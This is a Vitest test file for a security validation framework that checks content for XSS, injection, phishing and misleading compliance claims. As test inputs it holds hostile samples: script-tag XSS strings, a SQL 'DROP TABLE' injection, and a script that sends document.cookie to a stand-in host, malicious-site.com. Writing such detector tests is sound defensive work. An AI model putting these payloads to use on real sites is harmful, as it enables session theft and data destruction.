/**
 * Comprehensive Tests for Cybersecurity Validation Framework
 * Tests for multi-layer security validation, threat detection, and compliance
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { CybersecurityValidationFramework, type ContentValidationRequest, type SecurityValidationResult } from '@/services/security/CybersecurityValidationFramework';
import { AdminSecurityControlPanel } from '@/services/security/AdminSecurityControlPanel';
import { RealtimeSecurityMonitor } from '@/services/security/RealtimeSecurityMonitor';
import { EnhancedRAGSecurityIntegration } from '@/services/security/EnhancedRAGSecurityIntegration';

// Mock Supabase client
vi.mock('@/lib/supabase', () => ({
  supabase: {
    from: vi.fn(() => ({
      select: vi.fn(() => ({
        eq: vi.fn(() => ({
          single: vi.fn(() => Promise.resolve({ data: null, error: null }))
        })),
        gte: vi.fn(() => ({
          order: vi.fn(() => ({
            limit: vi.fn(() => Promise.resolve({ data: [], error: null }))
          }))
        })),
        insert: vi.fn(() => Promise.resolve({ error: null })),
        update: vi.fn(() => ({
          eq: vi.fn(() => Promise.resolve({ error: null }))
        })),
        delete: vi.fn(() => ({
          lt: vi.fn(() => Promise.resolve({ error: null }))
        }))
      })),
      rpc: vi.fn(() => Promise.resolve({ data: null, error: null })),
      channel: vi.fn(() => ({
        on: vi.fn(() => ({
          subscribe: vi.fn()
        }))
      })),
      removeAllChannels: vi.fn()
    }))
  }
}));

// Mock Google Generative AI
vi.mock('@google/generative-ai', () => ({
  GoogleGenerativeAI: vi.fn(() => ({
    getGenerativeModel: vi.fn(() => ({
      generateContent: vi.fn(() => Promise.resolve({
        response: {
          text: vi.fn(() => JSON.stringify({
            threats_detected: [],
            overall_assessment: 'safe',
            confidence_score: 0.95,
            compliance_notes: 'Content appears to be compliant with security standards'
          }))
        }
      }))
    }))
  }))
}));

// Mock HTML sanitizer
vi.mock('@/lib/security/htmlSanitizer', () => ({
  sanitizeRichText: vi.fn((content: string) => content),
  stripHtml: vi.fn((content: string) => content.replace(/<[^>]*>/g, ''))
}));

describe('CybersecurityValidationFramework', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    // Set up environment variables for testing
    vi.stubEnv('VITE_GEMINI_API_KEY', 'test-api-key');
  });

  afterEach(() => {
    vi.unstubAllEnvs();
  });

  describe('Multi-layer Content Validation', () => {
    it('should validate safe content and return low risk', async () => {
      const request: ContentValidationRequest = {
        content: 'This is a safe cybersecurity guidance document about implementing ISO 27001 controls.',
        content_type: 'web_scraped',
        source_url: 'https://trusted-security-site.com/iso27001-guide',
        framework_context: ['ISO27001'],
        user_id: 'test-user-id',
        organization_id: 'test-org-id'
      };

      const result = await CybersecurityValidationFramework.validateContent(request);

      expect(result.passed).toBe(true);
      expect(result.risk_level).toBe('low');
      expect(result.threats_detected).toHaveLength(0);
      expect(result.confidence_score).toBeGreaterThan(0.8);
      expect(result.validation_layers).toHaveLength(5);
      expect(result.metadata.validator_agent).toBe('CybersecurityValidationFramework');
    });

    it('should detect malicious JavaScript injection attempts', async () => {
      const request: ContentValidationRequest = {
        content: 'Click here for security guidance: <script>document.cookie="malicious=true"</script>',
        content_type: 'user_generated',
        framework_context: ['GDPR'],
        user_id: 'test-user-id'
      };

      const result = await CybersecurityValidationFramework.validateContent(request);

      expect(result.passed).toBe(false);
      expect(result.risk_level).toBe('high');
      expect(result.threats_detected.length).toBeGreaterThan(0);
      
      const maliciousContentThreat = result.threats_detected.find(
        threat => threat.type === 'malicious_content'
      );
      expect(maliciousContentThreat).toBeDefined();
      expect(maliciousContentThreat?.severity).toBe('high');
    });

    it('should detect social engineering patterns', async () => {
      const request: ContentValidationRequest = {
        content: 'URGENT! Your account has been suspended. Click here now to verify your identity and confirm your password immediately!',
        content_type: 'external_api',
        framework_context: ['SOC2']
      };

      const result = await CybersecurityValidationFramework.validateContent(request);

      expect(result.passed).toBe(false);
      expect(result.threats_detected.length).toBeGreaterThan(0);
      
      const socialEngineeringThreat = result.threats_detected.find(
        threat => threat.type === 'social_engineering'
      );
      expect(socialEngineeringThreat).toBeDefined();
      expect(socialEngineeringThreat?.severity).toBe('high');
    });

    it('should detect potential data exfiltration patterns', async () => {
      const request: ContentValidationRequest = {
        content: 'For testing purposes, use credit card 4532-1234-5678-9012 and SSN 123-45-6789',
        content_type: 'user_generated',
        framework_context: ['PCI-DSS', 'HIPAA']
      };

      const result = await CybersecurityValidationFramework.validateContent(request);

      expect(result.passed).toBe(false);
      expect(result.risk_level).toBe('critical');
      
      const dataExfiltrationThreat = result.threats_detected.find(
        threat => threat.type === 'data_exfiltration'
      );
      expect(dataExfiltrationThreat).toBeDefined();
      expect(dataExfiltrationThreat?.severity).toBe('critical');
    });

    it('should validate framework-specific compliance claims', async () => {
      const request: ContentValidationRequest = {
        content: 'Our solution guarantees 100% GDPR compliance instantly with automatic audit pass!',
        content_type: 'web_scraped',
        framework_context: ['GDPR'],
        source_url: 'https://suspicious-vendor.com/gdpr'
      };

      const result = await CybersecurityValidationFramework.validateContent(request);

      expect(result.threats_detected.length).toBeGreaterThan(0);
      
      const complianceThreat = result.threats_detected.find(
        threat => threat.type === 'compliance_violation'
      );
      expect(complianceThreat).toBeDefined();
      expect(complianceThreat?.description).toContain('misleading claims');
    });

    it('should handle validation errors gracefully', async () => {
      // Mock API failure
      vi.mocked(fetch).mockRejectedValueOnce(new Error('Network error'));

      const request: ContentValidationRequest = {
        content: 'Test content',
        content_type: 'web_scraped'
      };

      const result = await CybersecurityValidationFramework.validateContent(request);

      expect(result.passed).toBe(false);
      expect(result.risk_level).toBe('critical');
      expect(result.threats_detected.length).toBeGreaterThan(0);
      expect(result.threats_detected[0].description).toContain('validation system failure');
    });
  });

  describe('Performance and Scalability', () => {
    it('should complete validation within acceptable time limits', async () => {
      const request: ContentValidationRequest = {
        content: 'A'.repeat(10000), // Large content
        content_type: 'web_scraped',
        framework_context: ['ISO27001', 'GDPR', 'SOC2']
      };

      const startTime = Date.now();
      const result = await CybersecurityValidationFramework.validateContent(request);
      const processingTime = Date.now() - startTime;

      expect(processingTime).toBeLessThan(30000); // Should complete within 30 seconds
      expect(result.metadata.processing_time_ms).toBeLessThan(30000);
    });

    it('should handle concurrent validations efficiently', async () => {
      const requests = Array.from({ length: 5 }, (_, i) => ({
        content: `Test content ${i} for concurrent validation`,
        content_type: 'user_generated' as const,
        framework_context: ['ISO27001']
      }));

      const startTime = Date.now();
      const results = await Promise.all(
        requests.map(request => CybersecurityValidationFramework.validateContent(request))
      );
      const totalTime = Date.now() - startTime;

      expect(results).toHaveLength(5);
      expect(totalTime).toBeLessThan(60000); // All should complete within 1 minute
      results.forEach(result => {
        expect(result.metadata).toBeDefined();
        expect(result.validation_layers.length).toBeGreaterThan(0);
      });
    });
  });
});

describe('AdminSecurityControlPanel', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Security Dashboard Metrics', () => {
    it('should retrieve comprehensive security metrics', async () => {
      const metrics = await AdminSecurityControlPanel.getSecurityDashboardMetrics();

      expect(metrics).toHaveProperty('total_validations_24h');
      expect(metrics).toHaveProperty('threats_detected_24h');
      expect(metrics).toHaveProperty('high_risk_content');
      expect(metrics).toHaveProperty('pending_approvals');
      expect(metrics).toHaveProperty('quarantined_items');
      expect(metrics).toHaveProperty('avg_processing_time_ms');
      expect(metrics).toHaveProperty('top_threat_types');
      expect(metrics).toHaveProperty('risk_distribution');
      expect(metrics).toHaveProperty('framework_compliance_scores');

      expect(Array.isArray(metrics.top_threat_types)).toBe(true);
      expect(typeof metrics.risk_distribution).toBe('object');
      expect(typeof metrics.framework_compliance_scores).toBe('object');
    });

    it('should calculate accurate risk distribution', async () => {
      const metrics = await AdminSecurityControlPanel.getSecurityDashboardMetrics();

      const riskDistribution = metrics.risk_distribution;
      expect(riskDistribution).toHaveProperty('low');
      expect(riskDistribution).toHaveProperty('medium');
      expect(riskDistribution).toHaveProperty('high');
      expect(riskDistribution).toHaveProperty('critical');

      const totalRisk = Object.values(riskDistribution).reduce((sum, count) => sum + count, 0);
      expect(totalRisk).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Content Approval Queue Management', () => {
    it('should retrieve and filter content approval queue', async () => {
      const queue = await AdminSecurityControlPanel.getContentApprovalQueue({
        status: 'pending',
        priority: 'high'
      });

      expect(queue).toHaveProperty('items');
      expect(queue).toHaveProperty('total_count');
      expect(queue).toHaveProperty('priority_queue');
      expect(queue).toHaveProperty('overdue_items');

      expect(Array.isArray(queue.items)).toBe(true);
      expect(Array.isArray(queue.priority_queue)).toBe(true);
      expect(Array.isArray(queue.overdue_items)).toBe(true);
    });

    it('should process admin security actions correctly', async () => {
      const action = {
        action_type: 'approve' as const,
        content_id: 'test-content-id',
        admin_id: 'test-admin-id',
        reason: 'Content reviewed and approved for publication',
        security_notes: 'No security concerns identified'
      };

      const result = await AdminSecurityControlPanel.processSecurityAction(action);

      expect(result.success).toBe(true);
      expect(result.message).toContain('successfully processed');
    });

    it('should handle action processing errors gracefully', async () => {
      // Mock database error
      const mockError = new Error('Database connection failed');
      vi.mocked(fetch).mockRejectedValueOnce(mockError);

      const action = {
        action_type: 'reject' as const,
        content_id: 'invalid-content-id',
        admin_id: 'test-admin-id',
        reason: 'Test rejection'
      };

      const result = await AdminSecurityControlPanel.processSecurityAction(action);

      expect(result.success).toBe(false);
      expect(result.message).toContain('Failed to process');
    });
  });

  describe('Expert Review Workflow', () => {
    it('should create expert review workflow with correct stages', async () => {
      const workflow = await AdminSecurityControlPanel.createExpertReviewWorkflow(
        'test-content-id',
        'deep_analysis',
        'critical'
      );

      expect(workflow.workflow_id).toBeDefined();
      expect(workflow.content_id).toBe('test-content-id');
      expect(workflow.workflow_type).toBe('deep_analysis');
      expect(workflow.priority).toBe('critical');
      expect(workflow.stages.length).toBeGreaterThan(2);
      expect(workflow.escalation_rules.length).toBeGreaterThan(0);
    });

    it('should define appropriate stages for different workflow types', async () => {
      const standardWorkflow = await AdminSecurityControlPanel.createExpertReviewWorkflow(
        'test-1',
        'standard',
        'medium'
      );

      const deepAnalysisWorkflow = await AdminSecurityControlPanel.createExpertReviewWorkflow(
        'test-2',
        'deep_analysis',
        'high'
      );

      expect(standardWorkflow.stages.length).toBeLessThan(deepAnalysisWorkflow.stages.length);
      
      const hasDeepAnalysisStage = deepAnalysisWorkflow.stages.some(
        stage => stage.stage_name === 'Deep Technical Analysis'
      );
      expect(hasDeepAnalysisStage).toBe(true);
    });
  });

  describe('Security Incident Management', () => {
    it('should trigger incident response correctly', async () => {
      const incidentId = await AdminSecurityControlPanel.triggerIncidentResponse(
        'malware_detected',
        'high',
        ['content-1', 'content-2'],
        'Malware detected in uploaded content'
      );

      expect(incidentId).toBeDefined();
      expect(incidentId).toMatch(/^incident_\d+_[a-z0-9]+$/);
    });

    it('should retrieve security incidents with filters', async () => {
      const incidents = await AdminSecurityControlPanel.getSecurityIncidents({
        severity: 'critical',
        status: 'investigating'
      });

      expect(Array.isArray(incidents)).toBe(true);
    });
  });

  describe('Compliance Reporting', () => {
    it('should generate comprehensive compliance report', async () => {
      const report = await AdminSecurityControlPanel.generateComplianceReport(
        'test-org-id',
        ['ISO27001', 'GDPR'],
        {
          start: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString(),
          end: new Date().toISOString()
        }
      );

      expect(report.report_id).toBeDefined();
      expect(report.frameworks_assessed).toEqual(['ISO27001', 'GDPR']);
      expect(report.compliance_scores).toHaveProperty('ISO27001');
      expect(report.compliance_scores).toHaveProperty('GDPR');
      expect(Array.isArray(report.findings)).toBe(true);
      expect(report.risk_assessment).toHaveProperty('overall_risk');
      expect(report.risk_assessment).toHaveProperty('key_risks');
      expect(report.risk_assessment).toHaveProperty('mitigation_priorities');
    });
  });
});

describe('RealtimeSecurityMonitor', () => {
  let monitor: RealtimeSecurityMonitor;

  beforeEach(() => {
    vi.clearAllMocks();
    monitor = RealtimeSecurityMonitor.getInstance();
  });

  afterEach(async () => {
    monitor.stopMonitoring();
  });

  describe('Real-time Monitoring', () => {
    it('should start and stop monitoring correctly', async () => {
      expect(monitor.isMonitoring).toBe(false);

      await monitor.startMonitoring(1000); // 1 second interval for testing
      expect(monitor.isMonitoring).toBe(true);

      monitor.stopMonitoring();
      expect(monitor.isMonitoring).toBe(false);
    });

    it('should process validation results and generate alerts', async () => {
      const mockValidationResult: SecurityValidationResult = {
        passed: false,
        risk_level: 'critical',
        threats_detected: [{
          type: 'malicious_content',
          severity: 'critical',
          description: 'Malicious script detected',
          evidence: ['<script>alert("xss")</script>'],
          mitigation: 'Content blocked and quarantined'
        }],
        recommendations: ['Block content', 'Investigate source'],
        confidence_score: 0.95,
        validation_layers: [],
        metadata: {
          validated_at: new Date().toISOString(),
          validator_agent: 'test',
          processing_time_ms: 1000,
          content_hash: 'test-hash',
          validation_version: '1.0.0'
        }
      };

      const metadata = {
        content_type: 'web_scraped' as const,
        source_url: 'https://malicious-site.com',
        user_id: 'test-user'
      };

      await monitor.processValidationResult(mockValidationResult, metadata);

      // Should have generated an alert for critical threat
      const alerts = await monitor.getActiveSecurityAlerts({ severity: 'critical' });
      expect(alerts.length).toBeGreaterThan(0);
    });

    it('should support alert subscriptions', async () => {
      const alertsReceived: any[] = [];
      const unsubscribe = monitor.subscribe((alert) => {
        alertsReceived.push(alert);
      });

      await monitor.generateSecurityAlert({
        alert_type: 'threat_detected',
        severity: 'high',
        title: 'Test Alert',
        description: 'Test alert description'
      });

      expect(alertsReceived.length).toBe(1);
      expect(alertsReceived[0].title).toBe('Test Alert');

      unsubscribe();
    });

    it('should calculate security metrics correctly', async () => {
      const metrics = await monitor.getSecurityMetrics('24h');

      expect(metrics).toHaveProperty('timeframe', '24h');
      expect(metrics).toHaveProperty('total_validations');
      expect(metrics).toHaveProperty('threats_blocked');
      expect(metrics).toHaveProperty('compliance_score');
      expect(metrics).toHaveProperty('risk_score');
      expect(Array.isArray(metrics.trend_data)).toBe(true);

      expect(metrics.compliance_score).toBeGreaterThanOrEqual(0);
      expect(metrics.compliance_score).toBeLessThanOrEqual(100);
      expect(metrics.risk_score).toBeGreaterThanOrEqual(0);
      expect(metrics.risk_score).toBeLessThanOrEqual(100);
    });
  });

  describe('Monitoring Rules', () => {
    it('should add and manage monitoring rules', async () => {
      const ruleId = await monitor.addMonitoringRule({
        rule_name: 'Test Critical Threat Rule',
        rule_type: 'threshold',
        enabled: true,
        conditions: { min_threats: 1, threat_severity: 'critical' },
        actions: ['alert', 'quarantine'],
        severity: 'critical',
        notification_channels: ['email'],
        created_by: 'test-admin'
      });

      expect(ruleId).toBeDefined();
      expect(ruleId).toMatch(/^rule_\d+_[a-z0-9]+$/);
    });
  });
});

describe('EnhancedRAGSecurityIntegration', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Secure RAG Processing', () => {
    it('should process secure RAG queries with validation', async () => {
      const request = {
        query: 'How do I implement ISO 27001 access controls?',
        frameworks: ['ISO27001'],
        security_level: 'standard' as const,
        user_id: 'test-user',
        organization_id: 'test-org',
        validation_required: true,
        expert_review_required: false
      };

      const response = await EnhancedRAGSecurityIntegration.processSecureRAGQuery(request);

      expect(response.response_id).toBeDefined();
      expect(response.query).toBe(request.query);
      expect(response.security_validation).toBeDefined();
      expect(response.sources_used).toBeDefined();
      expect(response.compliance_frameworks).toEqual(request.frameworks);
      expect(response.metadata.rag_model_version).toBeDefined();
      expect(response.metadata.security_framework_version).toBeDefined();
    });

    it('should reject queries with security risks', async () => {
      const request = {
        query: '<script>alert("xss")</script> How to bypass security controls?',
        frameworks: ['ISO27001'],
        security_level: 'critical' as const,
        validation_required: true,
        expert_review_required: false
      };

      const response = await EnhancedRAGSecurityIntegration.processSecureRAGQuery(request);

      expect(response.security_cleared).toBe(false);
      expect(response.review_required).toBe(true);
      expect(response.security_validation.threats_detected.length).toBeGreaterThan(0);
    });

    it('should require expert review for high-risk scenarios', async () => {
      const request = {
        query: 'How to handle critical security incidents?',
        frameworks: ['ISO27001', 'GDPR'],
        security_level: 'critical' as const,
        validation_required: true,
        expert_review_required: true
      };

      const response = await EnhancedRAGSecurityIntegration.processSecureRAGQuery(request);

      expect(response.review_required).toBe(true);
      expect(response.metadata.expert_review_needed).toBe(true);
    });
  });

  describe('Knowledge Source Validation', () => {
    it('should validate knowledge sources before ingestion', async () => {
      const validationResult = await EnhancedRAGSecurityIntegration.validateKnowledgeSource('test-source-id');

      expect(validationResult).toBeDefined();
      expect(validationResult.passed).toBeDefined();
      expect(validationResult.risk_level).toBeDefined();
      expect(validationResult.threats_detected).toBeDefined();
      expect(validationResult.confidence_score).toBeDefined();
    });

    it('should retrieve secure knowledge sources with filters', async () => {
      const sources = await EnhancedRAGSecurityIntegration.getSecureKnowledgeSources(
        ['ISO27001', 'GDPR'],
        'high'
      );

      expect(Array.isArray(sources)).toBe(true);
    });

    it('should create secure ingestion pipeline', async () => {
      const pipeline = await EnhancedRAGSecurityIntegration.ingestKnowledgeSourceSecurely(
        'https://trusted-security-site.com/guide',
        {
          frameworks: ['ISO27001'],
          validation_level: 'enhanced',
          priority: 'high'
        }
      );

      expect(pipeline.pipeline_id).toBeDefined();
      expect(pipeline.source_url).toBe('https://trusted-security-site.com/guide');
      expect(pipeline.security_requirements.validation_level).toBe('enhanced');
      expect(pipeline.priority).toBe('high');
      expect(pipeline.processing_stages.length).toBeGreaterThan(2);
    });
  });

  describe('Security Summary and Reporting', () => {
    it('should generate comprehensive RAG security summary', async () => {
      const summary = await EnhancedRAGSecurityIntegration.getRAGSecuritySummary();

      expect(summary).toHaveProperty('total_sources');
      expect(summary).toHaveProperty('validated_sources');
      expect(summary).toHaveProperty('pending_validation');
      expect(summary).toHaveProperty('quarantined_sources');
      expect(summary).toHaveProperty('security_score_avg');
      expect(summary).toHaveProperty('frameworks_covered');
      expect(summary).toHaveProperty('risk_assessment');

      expect(Array.isArray(summary.frameworks_covered)).toBe(true);
      expect(['low', 'medium', 'high', 'critical']).toContain(summary.risk_assessment);
    });
  });
});

describe('Integration Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('End-to-End Security Validation Flow', () => {
    it('should complete full security validation workflow', async () => {
      // Step 1: Validate content
      const validationRequest: ContentValidationRequest = {
        content: 'Comprehensive guide to implementing GDPR data protection measures.',
        content_type: 'web_scraped',
        source_url: 'https://gdpr-info.eu/guide',
        framework_context: ['GDPR'],
        user_id: 'test-user',
        organization_id: 'test-org'
      };

      const validationResult = await CybersecurityValidationFramework.validateContent(validationRequest);
      expect(validationResult.passed).toBe(true);

      // Step 2: Process through admin control panel
      const metrics = await AdminSecurityControlPanel.getSecurityDashboardMetrics();
      expect(metrics.total_validations_24h).toBeGreaterThanOrEqual(0);

      // Step 3: Monitor with real-time system
      const monitor = RealtimeSecurityMonitor.getInstance();
      await monitor.processValidationResult(validationResult, {
        content_type: 'web_scraped',
        source_url: 'https://gdpr-info.eu/guide',
        user_id: 'test-user'
      });

      // Step 4: Use in secure RAG
      const ragResponse = await EnhancedRAGSecurityIntegration.processSecureRAGQuery({
        query: 'What are the key GDPR compliance requirements?',
        frameworks: ['GDPR'],
        security_level: 'standard',
        validation_required: true,
        expert_review_required: false
      });

      expect(ragResponse.security_cleared).toBe(true);
      expect(ragResponse.security_validation.passed).toBe(true);
    });

    it('should handle malicious content through complete workflow', async () => {
      // Step 1: Validate malicious content
      const validationRequest: ContentValidationRequest = {
        content: 'Click here: <script>document.location="http://malicious-site.com/steal?data="+document.cookie</script>',
        content_type: 'user_generated',
        framework_context: ['ISO27001'],
        user_id: 'test-user'
      };

      const validationResult = await CybersecurityValidationFramework.validateContent(validationRequest);
      expect(validationResult.passed).toBe(false);
      expect(validationResult.risk_level).toBe('high');

      // Step 2: Monitor should generate alert
      const monitor = RealtimeSecurityMonitor.getInstance();
      await monitor.processValidationResult(validationResult, {
        content_type: 'user_generated',
        user_id: 'test-user'
      });

      // Step 3: Should appear in approval queue
      const queue = await AdminSecurityControlPanel.getContentApprovalQueue({
        status: 'quarantined'
      });
      expect(queue.items.length).toBeGreaterThanOrEqual(0);

      // Step 4: RAG should block the content
      const ragResponse = await EnhancedRAGSecurityIntegration.processSecureRAGQuery({
        query: validationRequest.content,
        frameworks: ['ISO27001'],
        security_level: 'high',
        validation_required: true,
        expert_review_required: false
      });

      expect(ragResponse.security_cleared).toBe(false);
      expect(ragResponse.review_required).toBe(true);
    });
  });

  describe('Performance Under Load', () => {
    it('should handle multiple concurrent validations efficiently', async () => {
      const requests = Array.from({ length: 10 }, (_, i) => ({
        content: `Test cybersecurity content ${i} about implementing security controls.`,
        content_type: 'web_scraped' as const,
        framework_context: ['ISO27001', 'GDPR'],
        user_id: `test-user-${i}`
      }));

      const startTime = Date.now();
      const results = await Promise.all(
        requests.map(request => CybersecurityValidationFramework.validateContent(request))
      );
      const totalTime = Date.now() - startTime;

      expect(results).toHaveLength(10);
      expect(totalTime).toBeLessThan(120000); // Should complete within 2 minutes
      
      results.forEach((result, index) => {
        expect(result.metadata.validator_agent).toBe('CybersecurityValidationFramework');
        expect(result.validation_layers.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Error Handling and Recovery', () => {
    it('should handle network failures gracefully', async () => {
      // Mock network failure
      const originalFetch = global.fetch;
      global.fetch = vi.fn(() => Promise.reject(new Error('Network error')));

      const request: ContentValidationRequest = {
        content: 'Test content during network failure',
        content_type: 'web_scraped'
      };

      const result = await CybersecurityValidationFramework.validateContent(request);

      expect(result.passed).toBe(false);
      expect(result.risk_level).toBe('critical');
      expect(result.threats_detected.length).toBeGreaterThan(0);

      // Restore original fetch
      global.fetch = originalFetch;
    });

    it('should recover from partial service failures', async () => {
      // Test that the system continues to work even if some validation layers fail
      const request: ContentValidationRequest = {
        content: 'Test content with partial service failure',
        content_type: 'ai_generated',
        framework_context: ['ISO27001']
      };

      const result = await CybersecurityValidationFramework.validateContent(request);

      // Should still provide some validation result even with failures
      expect(result.metadata).toBeDefined();
      expect(result.validation_layers).toBeDefined();
    });
  });
});

describe('Security Compliance and Standards', () => {
  describe('OWASP Top 10 Coverage', () => {
    it('should detect injection attacks (A03:2021)', async () => {
      const sqlInjectionContent = "'; DROP TABLE users; --";
      const jsInjectionContent = '<script>alert("xss")</script>';

      const requests = [
        { content: sqlInjectionContent, content_type: 'user_generated' as const },
        { content: jsInjectionContent, content_type: 'user_generated' as const }
      ];

      for (const request of requests) {
        const result = await CybersecurityValidationFramework.validateContent(request);
        expect(result.passed).toBe(false);
        expect(result.threats_detected.length).toBeGreaterThan(0);
      }
    });

    it('should identify security misconfiguration patterns (A05:2021)', async () => {
      const misconfigContent = 'Default password is admin:admin. Debug mode enabled in production.';
      
      const request: ContentValidationRequest = {
        content: misconfigContent,
        content_type: 'web_scraped',
        framework_context: ['ISO27001']
      };

      const result = await CybersecurityValidationFramework.validateContent(request);
      // Should flag potential security misconfigurations
    });

    it('should detect vulnerable components references (A06:2021)', async () => {
      const vulnerableContent = 'Using jQuery 1.4.2 (known XSS vulnerabilities) and OpenSSL 1.0.1 (Heartbleed)';
      
      const request: ContentValidationRequest = {
        content: vulnerableContent,
        content_type: 'web_scraped'
      };

      const result = await CybersecurityValidationFramework.validateContent(request);
      // AI analysis should identify vulnerable component references
    });
  });

  describe('Framework Compliance Validation', () => {
    it('should validate ISO 27001 compliance requirements', async () => {
      const compliantContent = 'Implement access control policy A.9.1.1 with role-based access controls and regular access reviews.';
      
      const request: ContentValidationRequest = {
        content: compliantContent,
        content_type: 'web_scraped',
        framework_context: ['ISO27001']
      };

      const result = await CybersecurityValidationFramework.validateContent(request);
      expect(result.passed).toBe(true);
      expect(result.risk_level).toBe('low');
    });

    it('should validate GDPR data protection requirements', async () => {
      const gdprContent = 'Implement data protection by design and by default (Article 25) with encryption and pseudonymization.';
      
      const request: ContentValidationRequest = {
        content: gdprContent,
        content_type: 'expert_contributed',
        framework_context: ['GDPR']
      };

      const result = await CybersecurityValidationFramework.validateContent(request);
      expect(result.passed).toBe(true);
    });

    it('should flag incorrect compliance claims', async () => {
      const incorrectClaims = [
        'Our tool provides instant SOC 2 Type II certification',
        'Achieve 100% PCI DSS compliance automatically',
        'HIPAA compliance guaranteed without any configuration'
      ];

      for (const claim of incorrectClaims) {
        const request: ContentValidationRequest = {
          content: claim,
          content_type: 'web_scraped',
          framework_context: ['SOC2', 'PCI-DSS', 'HIPAA']
        };

        const result = await CybersecurityValidationFramework.validateContent(request);
        const complianceThreat = result.threats_detected.find(
          threat => threat.type === 'compliance_violation'
        );
        expect(complianceThreat).toBeDefined();
      }
    });
  });
});